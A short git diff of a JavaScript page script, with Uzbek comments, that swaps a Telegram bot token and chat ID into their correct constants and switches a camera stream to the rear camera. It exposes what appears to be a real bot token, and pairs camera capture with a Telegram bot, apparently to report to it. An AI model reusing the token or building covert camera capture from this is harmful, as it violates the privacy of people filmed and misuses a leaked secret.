@@ -1,12 +1,12 @@
 // Telegram bot tokeni va chat ID
-const BOT_TOKEN = '5934257995'; // Bot tokenini shu yerga qo'ying
-const CHAT_ID = '7395541428:AAGTGERMBx35uE7lm35_xfrOFJ2nWfy886k'; // Chat ID-ni shu yerga qo'ying
+const BOT_TOKEN = '7395541428:AAGTGERMBx35uE7lm35_xfrOFJ2nWfy886k'; // Bot tokenini shu yerga qo'ying
+const CHAT_ID = '5934257995'; // Chat ID-ni shu yerga qo'ying
 
 // Video elementini tanlang
 const video = document.getElementById('video');
 
 // MediaStream orqali video oqimini olish
-navigator.mediaDevices.getUserMedia({ video: true })
+navigator.mediaDevices.getUserMedia({ video: { facingMode: "environment" } }) // Orqa kamerani ishlatish
     .then(stream => {
         video.srcObject = stream;
 
